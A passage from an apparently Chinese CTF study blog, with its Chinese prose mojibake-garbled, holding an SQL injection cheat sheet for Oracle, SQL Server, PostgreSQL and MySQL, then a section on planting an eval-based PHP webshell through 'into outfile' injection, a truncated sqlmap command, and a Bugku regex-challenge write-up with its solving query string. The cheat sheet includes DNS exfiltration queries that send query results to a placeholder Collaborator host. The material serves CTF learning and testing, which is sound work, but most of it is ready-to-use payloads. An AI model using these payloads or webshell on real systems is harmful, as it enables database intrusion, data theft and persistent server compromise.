<h2 id="å­—ç¬¦ä¸²è¿æ¥"><a href="#å­—ç¬¦ä¸²è¿æ¥" class="headerlink" title="å­—ç¬¦ä¸²è¿æ¥"></a>å­—ç¬¦ä¸²è¿æ¥</h2><p>æ‚¨å¯ä»¥å°†å¤šä¸ªå­—ç¬¦ä¸²è¿æ¥åœ¨ä¸€èµ·ä»¥å½¢æˆä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p>
<p>| ç”²éª¨æ–‡ | <code>&#39;foo&#39;||&#39;bar&#39;</code>                                               |<br>| :â€”â€“ | â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” |<br>| å¾®è½¯   | <code>&#39;foo&#39;+&#39;bar&#39;</code>                                                |<br>| æ•°æ®åº“ | <code>&#39;foo&#39;||&#39;bar&#39;</code>                                               |<br>| MySQL  | <code>&#39;foo&#39; &#39;bar&#39;</code>[æ³¨æ„ä¸¤ä¸ªå­—ç¬¦ä¸²ä¹‹é—´çš„ç©ºæ ¼] <code>CONCAT(&#39;foo&#39;,&#39;bar&#39;)</code> |</p>
<h2 id="å­ä¸²"><a href="#å­ä¸²" class="headerlink" title="å­ä¸²"></a>å­ä¸²</h2><p>æ‚¨å¯ä»¥ä»å…·æœ‰æŒ‡å®šé•¿åº¦çš„æŒ‡å®šåç§»é‡ä¸­æå–å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚è¯·æ³¨æ„ï¼Œåç§»ç´¢å¼•æ˜¯ä» 1 å¼€å§‹çš„ã€‚ä»¥ä¸‹æ¯ä¸ªè¡¨è¾¾å¼éƒ½å°†è¿”å›å­—ç¬¦ä¸²<code>ba</code>ã€‚</p>
<table>
<thead>
<tr>
<th align="left">ç”²éª¨æ–‡</th>
<th><code>SUBSTR(&#39;foobar&#39;, 4, 2)</code></th>
</tr>
</thead>
<tbody><tr>
<td align="left">å¾®è½¯</td>
<td><code>SUBSTRING(&#39;foobar&#39;, 4, 2)</code></td>
</tr>
<tr>
<td align="left">æ•°æ®åº“</td>
<td><code>SUBSTRING(&#39;foobar&#39;, 4, 2)</code></td>
</tr>
<tr>
<td align="left">MySQL</td>
<td><code>SUBSTRING(&#39;foobar&#39;, 4, 2)</code></td>
</tr>
</tbody></table>
<h2 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h2><p>æ‚¨å¯ä»¥ä½¿ç”¨æ³¨é‡Šæ¥æˆªæ–­æŸ¥è¯¢å¹¶åˆ é™¤è¾“å…¥åçš„åŸå§‹æŸ¥è¯¢éƒ¨åˆ†ã€‚</p>
<table>
<thead>
<tr>
<th align="left">ç”²éª¨æ–‡</th>
<th><code>--comment</code></th>
</tr>
</thead>
<tbody><tr>
<td align="left">å¾®è½¯</td>
<td><code>--comment/*comment*/</code></td>
</tr>
<tr>
<td align="left">æ•°æ®åº“</td>
<td><code>--comment/*comment*/</code></td>
</tr>
<tr>
<td align="left">MySQL</td>
<td><code>#comment</code> <code>-- comment</code>[æ³¨æ„åŒç ´æŠ˜å·åçš„ç©ºæ ¼] <code>/*comment*/</code></td>
</tr>
</tbody></table>
<h2 id="æ•°æ®åº“ç‰ˆæœ¬"><a href="#æ•°æ®åº“ç‰ˆæœ¬" class="headerlink" title="æ•°æ®åº“ç‰ˆæœ¬"></a>æ•°æ®åº“ç‰ˆæœ¬</h2><p>æ‚¨å¯ä»¥æŸ¥è¯¢æ•°æ®åº“ä»¥ç¡®å®šå…¶ç±»å‹å’Œç‰ˆæœ¬ã€‚åœ¨åˆ¶å®šæ›´å¤æ‚çš„æ”»å‡»æ—¶ï¼Œæ­¤ä¿¡æ¯å¾ˆæœ‰ç”¨ã€‚</p>
<table>
<thead>
<tr>
<th align="left">ç”²éª¨æ–‡</th>
<th><code>SELECT banner FROM v$versionSELECT version FROM v$instance</code></th>
</tr>
</thead>
<tbody><tr>
<td align="left">å¾®è½¯</td>
<td><code>SELECT @@version</code></td>
</tr>
<tr>
<td align="left">æ•°æ®åº“</td>
<td><code>SELECT version()</code></td>
</tr>
<tr>
<td align="left">MySQL</td>
<td><code>SELECT @@version</code></td>
</tr>
</tbody></table>
<h2 id="æ•°æ®åº“å†…å®¹"><a href="#æ•°æ®åº“å†…å®¹" class="headerlink" title="æ•°æ®åº“å†…å®¹"></a>æ•°æ®åº“å†…å®¹</h2><p>æ‚¨å¯ä»¥åˆ—å‡ºæ•°æ®åº“ä¸­å­˜åœ¨çš„è¡¨ï¼Œä»¥åŠè¿™äº›è¡¨åŒ…å«çš„åˆ—ã€‚</p>
<table>
<thead>
<tr>
<th align="left">ç”²éª¨æ–‡</th>
<th><code>SELECT * FROM all_tablesSELECT * FROM all_tab_columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></th>
</tr>
</thead>
<tbody><tr>
<td align="left">å¾®è½¯</td>
<td><code>SELECT * FROM information_schema.tablesSELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
</tr>
<tr>
<td align="left">æ•°æ®åº“</td>
<td><code>SELECT * FROM information_schema.tablesSELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
</tr>
<tr>
<td align="left">MySQL</td>
<td><code>SELECT * FROM information_schema.tablesSELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
</tr>
</tbody></table>
<h2 id="æ¡ä»¶é”™è¯¯"><a href="#æ¡ä»¶é”™è¯¯" class="headerlink" title="æ¡ä»¶é”™è¯¯"></a>æ¡ä»¶é”™è¯¯</h2><p>æ‚¨å¯ä»¥æµ‹è¯•å•ä¸ªå¸ƒå°”æ¡ä»¶å¹¶åœ¨æ¡ä»¶ä¸ºçœŸæ—¶è§¦å‘æ•°æ®åº“é”™è¯¯ã€‚</p>
<table>
<thead>
<tr>
<th align="left">ç”²éª¨æ–‡</th>
<th><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual</code></th>
</tr>
</thead>
<tbody><tr>
<td align="left">å¾®è½¯</td>
<td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</code></td>
</tr>
<tr>
<td align="left">æ•°æ®åº“</td>
<td><code>1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN CAST(1/0 AS INTEGER) ELSE NULL END)</code></td>
</tr>
<tr>
<td align="left">MySQL</td>
<td><code>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),&#39;a&#39;)</code></td>
</tr>
</tbody></table>
<h2 id="æ‰¹é‡ï¼ˆæˆ–å †å ï¼‰æŸ¥è¯¢"><a href="#æ‰¹é‡ï¼ˆæˆ–å †å ï¼‰æŸ¥è¯¢" class="headerlink" title="æ‰¹é‡ï¼ˆæˆ–å †å ï¼‰æŸ¥è¯¢"></a>æ‰¹é‡ï¼ˆæˆ–å †å ï¼‰æŸ¥è¯¢</h2><p>æ‚¨å¯ä»¥ä½¿ç”¨æ‰¹å¤„ç†æŸ¥è¯¢æ¥è¿ç»­æ‰§è¡Œå¤šä¸ªæŸ¥è¯¢ã€‚è¯·æ³¨æ„ï¼Œåœ¨æ‰§è¡Œåç»­æŸ¥è¯¢æ—¶ï¼Œä¸ä¼šå°†ç»“æœè¿”å›ç»™åº”ç”¨ç¨‹åºã€‚å› æ­¤ï¼Œè¯¥æŠ€æœ¯ä¸»è¦ç”¨äºè§£å†³ç›²æ¼æ´ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ç¬¬äºŒä¸ªæŸ¥è¯¢æ¥è§¦å‘ DNS æŸ¥æ‰¾ã€æ¡ä»¶é”™è¯¯æˆ–æ—¶é—´å»¶è¿Ÿã€‚</p>
<table>
<thead>
<tr>
<th align="left">ç”²éª¨æ–‡</th>
<th><code>Does not support batched queries.</code></th>
</tr>
</thead>
<tbody><tr>
<td align="left">å¾®è½¯</td>
<td><code>QUERY-1-HERE; QUERY-2-HERE</code></td>
</tr>
<tr>
<td align="left">æ•°æ®åº“</td>
<td><code>QUERY-1-HERE; QUERY-2-HERE</code></td>
</tr>
<tr>
<td align="left">MySQL</td>
<td><code>QUERY-1-HERE; QUERY-2-HERE</code></td>
</tr>
</tbody></table>
<h4 id="ç¬”è®°"><a href="#ç¬”è®°" class="headerlink" title="ç¬”è®°"></a>ç¬”è®°</h4><p>å¯¹äº MySQLï¼Œæ‰¹å¤„ç†æŸ¥è¯¢é€šå¸¸ä¸èƒ½ç”¨äº SQL æ³¨å…¥ã€‚ä½†æ˜¯ï¼Œå¦‚æœç›®æ ‡åº”ç”¨ç¨‹åºä½¿ç”¨æŸäº› PHP æˆ– Python API ä¸ MySQL æ•°æ®åº“é€šä¿¡ï¼Œè¿™å¶å°”æ˜¯å¯èƒ½çš„ã€‚</p>
<h2 id="æ—¶é—´å»¶è¿Ÿ"><a href="#æ—¶é—´å»¶è¿Ÿ" class="headerlink" title="æ—¶é—´å»¶è¿Ÿ"></a>æ—¶é—´å»¶è¿Ÿ</h2><p>å¤„ç†æŸ¥è¯¢æ—¶ï¼Œæ‚¨å¯èƒ½ä¼šåœ¨æ•°æ®åº“ä¸­é€ æˆæ—¶é—´å»¶è¿Ÿã€‚ä»¥ä¸‹å°†å¯¼è‡´ 10 ç§’çš„æ— æ¡ä»¶æ—¶é—´å»¶è¿Ÿã€‚</p>
<table>
<thead>
<tr>
<th align="left">ç”²éª¨æ–‡</th>
<th><code>dbms_pipe.receive_message((&#39;a&#39;),10)</code></th>
</tr>
</thead>
<tbody><tr>
<td align="left">å¾®è½¯</td>
<td><code>WAITFOR DELAY &#39;0:0:10&#39;</code></td>
</tr>
<tr>
<td align="left">æ•°æ®åº“</td>
<td><code>SELECT pg_sleep(10)</code></td>
</tr>
<tr>
<td align="left">MySQL</td>
<td><code>SELECT SLEEP(10)</code></td>
</tr>
</tbody></table>
<h2 id="æœ‰æ¡ä»¶çš„æ—¶é—´å»¶è¿Ÿ"><a href="#æœ‰æ¡ä»¶çš„æ—¶é—´å»¶è¿Ÿ" class="headerlink" title="æœ‰æ¡ä»¶çš„æ—¶é—´å»¶è¿Ÿ"></a>æœ‰æ¡ä»¶çš„æ—¶é—´å»¶è¿Ÿ</h2><p>æ‚¨å¯ä»¥æµ‹è¯•å•ä¸ªå¸ƒå°”æ¡ä»¶å¹¶åœ¨æ¡ä»¶ä¸ºçœŸæ—¶è§¦å‘æ—¶é—´å»¶è¿Ÿã€‚</p>
<p>| ç”²éª¨æ–‡ | <code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN &#39;a&#39;||dbms_pipe.receive_message((&#39;a&#39;),10) ELSE NULL END FROM dual</code> |<br>| :â€”â€“ | â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” |<br>| å¾®è½¯   | <code>IF (YOUR-CONDITION-HERE) WAITFOR DELAY &#39;0:0:10&#39;</code>            |<br>| æ•°æ®åº“ | <code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</code> |<br>| MySQL  | <code>SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),&#39;a&#39;)</code>               |</p>
<h2 id="DNSæŸ¥è¯¢"><a href="#DNSæŸ¥è¯¢" class="headerlink" title="DNSæŸ¥è¯¢"></a>DNSæŸ¥è¯¢</h2><p>æ‚¨å¯ä»¥ä½¿æ•°æ®åº“å¯¹å¤–éƒ¨åŸŸæ‰§è¡Œ DNS æŸ¥æ‰¾ã€‚ä¸ºæ­¤ï¼Œæ‚¨éœ€è¦ä½¿ç”¨<a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator-client">Burp Collaborator å®¢æˆ·ç«¯</a>ç”Ÿæˆä¸€ä¸ªæ‚¨å°†åœ¨æ”»å‡»ä¸­ä½¿ç”¨çš„å”¯ä¸€ Burp Collaborator å­åŸŸï¼Œç„¶åè½®è¯¢ Collaborator æœåŠ¡å™¨ä»¥ç¡®è®¤æ˜¯å¦è¿›è¡Œäº† DNS æŸ¥æ‰¾ã€‚</p>
<table>
<thead>
<tr>
<th align="left">ç”²éª¨æ–‡</th>
<th>ä»¥ä¸‹æŠ€æœ¯åˆ©ç”¨ XML å¤–éƒ¨å®ä½“ ( <a href="https://portswigger.net/web-security/xxe">XXE</a> ) æ¼æ´è§¦å‘ DNS æŸ¥æ‰¾ã€‚è¯¥æ¼æ´å·²è¢«ä¿®è¡¥ï¼Œä½†å­˜åœ¨è®¸å¤šæœªä¿®è¡¥çš„ Oracle å®‰è£…ï¼š <code>SELECT EXTRACTVALUE(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) FROM dual</code>  ä»¥ä¸‹æŠ€æœ¯é€‚ç”¨äºå®Œå…¨ä¿®è¡¥çš„ Oracle å®‰è£…ï¼Œä½†éœ€è¦æå‡æƒé™ï¼š <code>SELECT UTL_INADDR.get_host_address(&#39;BURP-COLLABORATOR-SUBDOMAIN&#39;)</code></th>
</tr>
</thead>
<tbody><tr>
<td align="left">å¾®è½¯</td>
<td><code>exec master..xp_dirtree &#39;//BURP-COLLABORATOR-SUBDOMAIN/a&#39;</code></td>
</tr>
<tr>
<td align="left">æ•°æ®åº“</td>
<td><code>copy (SELECT &#39;&#39;) to program &#39;nslookup BURP-COLLABORATOR-SUBDOMAIN&#39;</code></td>
</tr>
<tr>
<td align="left">MySQL</td>
<td>ä»¥ä¸‹æŠ€æœ¯ä»…é€‚ç”¨äº Windowsï¼š <code>LOAD_FILE(&#39;\\\\BURP-COLLABORATOR-SUBDOMAIN\\a&#39;)</code> <code>SELECT ... INTO OUTFILE &#39;\\\\BURP-COLLABORATOR-SUBDOMAIN\a&#39;</code></td>
</tr>
</tbody></table>
<h2 id="å¸¦æ•°æ®æ³„éœ²çš„-DNS-æŸ¥æ‰¾"><a href="#å¸¦æ•°æ®æ³„éœ²çš„-DNS-æŸ¥æ‰¾" class="headerlink" title="å¸¦æ•°æ®æ³„éœ²çš„ DNS æŸ¥æ‰¾"></a>å¸¦æ•°æ®æ³„éœ²çš„ DNS æŸ¥æ‰¾</h2><p>æ‚¨å¯ä»¥ä½¿æ•°æ®åº“å¯¹åŒ…å«æ³¨å…¥æŸ¥è¯¢ç»“æœçš„å¤–éƒ¨åŸŸæ‰§è¡Œ DNS æŸ¥æ‰¾ã€‚ä¸ºæ­¤ï¼Œæ‚¨éœ€è¦ä½¿ç”¨<a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator-client">Burp Collaborator å®¢æˆ·ç«¯</a>ç”Ÿæˆæ‚¨å°†åœ¨æ”»å‡»ä¸­ä½¿ç”¨çš„å”¯ä¸€ Burp Collaborator å­åŸŸï¼Œç„¶åè½®è¯¢ Collaborator æœåŠ¡å™¨ä»¥æ£€ç´¢ä»»ä½• DNS äº¤äº’çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ³„éœ²çš„æ•°æ®ã€‚</p>
<p>| ç”²éª¨æ–‡ | <code>SELECT EXTRACTVALUE(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://&#39;||(SELECT YOUR-QUERY-HERE)||&#39;.BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) FROM dual</code> |<br>| :â€”â€“ | â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” |<br>| å¾®è½¯   | <code>declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec(&#39;master..xp_dirtree &quot;//&#39;+@p+&#39;.BURP-COLLABORATOR-SUBDOMAIN/a&quot;&#39;)</code> |<br>| æ•°æ®åº“ | <code>create OR replace function f() returns void as $$declare c text;declare p text;beginSELECT into p (SELECT YOUR-QUERY-HERE);c := &#39;copy (SELECT &#39;&#39;&#39;&#39;) to program &#39;&#39;nslookup &#39;||p||&#39;.BURP-COLLABORATOR-SUBDOMAIN&#39;&#39;&#39;;execute c;END;$$ language plpgsql security definer;SELECT f();</code> |<br>| MySQL  | ä»¥ä¸‹æŠ€æœ¯ä»…é€‚ç”¨äº Windowsï¼š <code>SELECT YOUR-QUERY-HERE INTO OUTFILE &#39;\\\\BURP-COLLABORATOR-SUBDOMAIN\a&#39;</code> |</p>
<h2 id="SQLæ³¨å…¥æ€ä¹ˆå†™å…¥webshellï¼Ÿ"><a href="#SQLæ³¨å…¥æ€ä¹ˆå†™å…¥webshellï¼Ÿ" class="headerlink" title="SQLæ³¨å…¥æ€ä¹ˆå†™å…¥webshellï¼Ÿ"></a>SQLæ³¨å…¥æ€ä¹ˆå†™å…¥webshellï¼Ÿ</h2><h3 id="æ¡ä»¶ï¼š"><a href="#æ¡ä»¶ï¼š" class="headerlink" title="æ¡ä»¶ï¼š"></a>æ¡ä»¶ï¼š</h3><p>1ã€çŸ¥é“webç»å¯¹è·¯å¾„</p>
<p>2ã€æœ‰æ–‡ä»¶å†™å…¥æƒé™(ä¸€èˆ¬æƒ…å†µåªæœ‰ROOTç”¨æˆ·æœ‰)</p>
<p>3ã€æ•°æ®åº“å¼€å¯äº†secure_file_privè®¾ç½®</p>
<p>â€‹    ç„¶åå°±èƒ½ç”¨select into outfileå†™å…¥webshell</p>
<h3 id="å¸¸è§æ‰‹æ³•ï¼š"><a href="#å¸¸è§æ‰‹æ³•ï¼š" class="headerlink" title="å¸¸è§æ‰‹æ³•ï¼š"></a>å¸¸è§æ‰‹æ³•ï¼š</h3><p><strong>è”åˆæ³¨å…¥å†™å…¥</strong></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,"&lt;?php @eval($_POST['</span>shell<span class="token string">']);?>",3 into outfile '</span><span class="token constant">C</span><span class="token operator">:</span>\\phpstudy\\<span class="token constant">WWW</span>\\sqli\\shell<span class="token punctuation">.</span>php'#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>dumpfileå‡½æ•°å†™å…¥</strong></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,"&lt;?php @eval($_POST['</span>shell<span class="token string">']);?>",3 into dumpfile '</span><span class="token constant">C</span><span class="token operator">:</span>\\phpstudy\\<span class="token constant">WWW</span>\\sqli\\shell<span class="token punctuation">.</span>php'#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>lines terminated by å†™å…¥</strong></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span> into outfile <span class="token string">'C:/wamp64/www/shell.php'</span> lines terminated by <span class="token string">'&lt;?php phpinfo()?>'</span><span class="token punctuation">;</span>
<span class="token comment">//lines terminated by å¯ä»¥ç†è§£ä¸º ä»¥æ¯è¡Œç»ˆæ­¢çš„ä½ç½®æ·»åŠ  xx å†…å®¹ã€‚</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>lines starting by å†™å…¥</strong></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span> into outfile <span class="token string">'C:/wamp64/www/shell.php'</span> lines starting by <span class="token string">'&lt;?php phpinfo()?>'</span><span class="token punctuation">;</span>
<span class="token comment">//åˆ©ç”¨ lines starting by è¯­å¥æ‹¼æ¥webshellçš„å†…å®¹ã€‚lines starting by å¯ä»¥ç†è§£ä¸º ä»¥æ¯è¡Œå¼€å§‹çš„ä½ç½®æ·»åŠ  xx å†…å®¹ã€‚</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>fields terminated by å†™å…¥</strong></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span> into outfile <span class="token string">'C:/wamp64/www/work/shell.php'</span> fields terminated by <span class="token string">'&lt;?php phpinfo() ?>'</span><span class="token punctuation">;</span>
<span class="token comment">//åˆ©ç”¨ fields terminated by è¯­å¥æ‹¼æ¥webshellçš„å†…å®¹ã€‚fields terminated by å¯ä»¥ç†è§£ä¸º ä»¥æ¯ä¸ªå­—æ®µçš„ä½ç½®æ·»åŠ  xx å†…å®¹ã€‚</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>columns terminated by å†™å…¥</strong></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span> into outfile <span class="token string">'C:/wamp64/www/shell.php'</span> <span class="token constant">COLUMNS</span> terminated by <span class="token string">'&lt;?php phpinfo() ?>'</span><span class="token punctuation">;</span>
<span class="token comment">//åˆ©ç”¨ fields terminated by è¯­å¥æ‹¼æ¥webshellçš„å†…å®¹ã€‚fields terminated by å¯ä»¥ç†è§£ä¸º ä»¥æ¯ä¸ªå­—æ®µçš„ä½ç½®æ·»åŠ  xx å†…å®¹ã€‚</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>sqlmapå†™å…¥</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">å†™ï¼š<span class="token punctuation">(</span>è¦å†™çš„æ–‡ä»¶ï¼Œå¿…é¡»åœ¨kaliæœ¬æœºé‡Œæœ‰<span class="token punctuation">)</span>
å†™å…¥åˆ° <span class="token operator">/</span>tmp ç›®å½•ä¸‹  
sqlmap <span class="token operator">-</span>u "http:<span class="token comment">//127.0.0.1/index.php?page=user-info.php&amp;username=a%27f%27v&amp;password=afv&amp;us</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>çŸ¥è¯†ç‚¹</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugkuä¹‹webéƒ¨åˆ†è§£é¢˜æ€è·¯</title>
    <url>/2023/01/15/Bugku%E4%B9%8Bweb%E9%83%A8%E5%88%86%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="No-one-knows-regex-better-than-me"><a href="#No-one-knows-regex-better-than-me" class="headerlink" title="No one knows regex better than me"></a>No one knows regex better than me</h2><p><strong>çŸ¥è¯†ç‚¹ï¼šæ­£åˆ™è¡¨è¾¾å¼</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$zero</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'zero'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$first</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'first'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$second</span><span class="token operator">=</span><span class="token variable">$zero</span><span class="token operator">.</span><span class="token variable">$first</span><span class="token punctuation">;</span><span class="token comment">//å°†zeroå’Œfirstè¿æ¥èµ·æ¥</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/Yeedo|wants|a|girl|friend|or|a|flag/i"</span><span class="token punctuation">,</span><span class="token variable">$second</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$key</span><span class="token operator">=</span><span class="token variable">$second</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\.\.|flag/"</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Noooood hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$third</span><span class="token operator">=</span><span class="token variable">$first</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\|\056\160\150\x70/i"</span><span class="token punctuation">,</span><span class="token variable">$third</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//  è§£ç åï¼šâ€|.phpâ€œ</span>
            <span class="token variable">$end</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$third</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$zero</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$end</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//maybe flag in flag.php</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>error_reporting(0)<strong>è¡¨ç¤ºä¸æŠ¥å‘Šé”™è¯¯<br>ç„¶åç”¨$REQUESTä¼ zeroå’Œfirst<br>second&#x3D;zero.first<br>secondä¸­è¦åŒ…å«</strong>&#x2F;Yeedo|wants|a|girl|friend|or|a|flag&#x2F;<strong>è¿™é‡Œé¢çš„å…¶ä¸­ä¸€ä¸ªï¼Œå¹¶ä¸”ä¸åŒºåˆ†å¤§å°å†™ã€‚<br>ç„¶åkey&#x3D;second&#x3D;zero.first<br>keyä¸­ä¸èƒ½æœ‰</strong>..<strong>å’Œ</strong>flag</strong>ã€‚<br>å¦å¤–ï¼Œthird&#x3D;firstã€‚<br><strong>\056\160\150</strong>ä¸ºå…«è¿›åˆ¶ï¼Œ<strong>\x70</strong>ä¸ºåå…­è¿›åˆ¶<br>thirdä¸­è¦æœ‰**|.php<strong>ï¼Œ</strong>substr**æ˜¯æˆªå–å­—ç¬¦ï¼Œendå–å€¼æ—¶ä»thirdçš„ç¬¬5ä½å¼€å§‹å–å€¼ï¼Œç„¶åå¾—åˆ°base64è§£å¯†çš„zeroä¸endè¿æ¥</p>
<p><strong>æ€è·¯ï¼š</strong></p>
<p>å…ˆåœ¨zeroä¸­ä¼ å…¥base74åŠ å¯†åçš„flag(<strong>ZmxhZw&#x3D;&#x3D;</strong>)ï¼Œæç¤ºè¯´flagåœ¨flag.phpä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ€åè¦æ„é€ å‡ºflag.phpã€‚è€Œç¬¬ä¸€ä¸ªifä¼šæŠŠflagè¿‡æ»¤æ‰ï¼Œåˆè€ƒè™‘åˆ°æœ€åä¼šè¿›è¡Œbase64è§£ç ä¸firstæ‹¼æ¥ï¼Œæ‰€ä»¥flagå°±ç”¨base64åŠ å¯†ä¼ åˆ°zeroä¸­ï¼Œç”±äºç¬¬äºŒä¸ªifæŠŠ**..<strong>è¿‡æ»¤æ‰äº†ï¼Œå¦‚æœç›´æ¥åœ¨firstä¸­ä¼ å…¥äº†.phpåï¼Œsecondä¼šå˜æˆflag..phpï¼Œä¼šè¢«è¿‡æ»¤ã€‚sudsträ¼šæˆªå–æ‰å‰å››ä¸ªå­—ç¬¦ï¼Œä»ç¬¬äº”ä¸ªå­—ç¬¦å¼€å§‹æ¥æ”¶ï¼Œå¹¶ä¸”firstå€¼ä¸­è¦åŒ…å«</strong>&#x2F;Yeedo|wants|a|girl|friend|or|a|flag&#x2F;<strong>å…¶ä¸­ä¸€ä¸ªæ‰èƒ½æ­£å¸¸å¾€ä¸‹è¿›è¡Œï¼Œæ‰€ä»¥firstç›´æ¥ä¼ å…¥</strong>flag|.php**<br><strong>æ‰€ä»¥æ„å»º?zero&#x3D;ZmxhZw&#x3D;&#x3D;&amp;first&#x3D;flag|.php</strong></p>
